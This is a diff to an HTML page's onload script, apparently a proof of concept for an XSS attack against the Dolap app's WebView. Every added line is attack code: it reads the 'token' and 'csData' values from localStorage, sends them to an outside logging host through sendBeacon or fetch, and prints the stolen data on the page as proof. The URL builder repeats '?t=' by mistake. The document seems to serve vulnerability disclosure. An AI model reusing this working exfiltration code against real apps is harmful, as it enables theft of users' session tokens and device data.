@@ -4,14 +4,33 @@
   <script>
     window.onload = function() {
 
+      // Step 1: prove arbitrary JS execution in Dolap's WebView context
+      alert('XSS — JavaScript executing on attacker.com inside Dolap WebView');
+
+      // Step 2: wait 1.5 s for Dolap's onPageFinished to fire and inject tokens
       setTimeout(function() {
-        var token = localStorage.getItem('token');
-        var csData = localStorage.getItem('csData');
-        if (token) {
-          fetch('https://evilios.free.beeceptor.com/log?t=' + encodeURIComponent(token) +
-                '&d=' + encodeURIComponent(csData));
+        var token  = localStorage.getItem('token')  || '';
+        var csData = localStorage.getItem('csData') || '';
+
+        // Step 3: exfiltrate — send regardless of whether token is empty
+        //         (unauthenticated sessions still expose FCM token, sid, device info)
+        var url = 'https://evilios.free.beeceptor.com/log?t='
+                + '?t='  + encodeURIComponent(token)
+                + '&d='  + encodeURIComponent(csData);
+
+        // beacon is fire-and-forget; fallback to fetch if unavailable
+        if (navigator.sendBeacon) {
+          navigator.sendBeacon(url);
+        } else {
+          fetch(url, { mode: 'no-cors' });
         }
-      }, 1000);
+
+        // Step 4: visual proof — render stolen data on screen
+        document.body.innerHTML =
+          '<h2 style="color:red">Token: ' + (token || '(empty — not logged in)') + '</h2>' +
+          '<pre>' + csData + '</pre>';
+
+      }, 1500);
     };
   </script>
 </head>
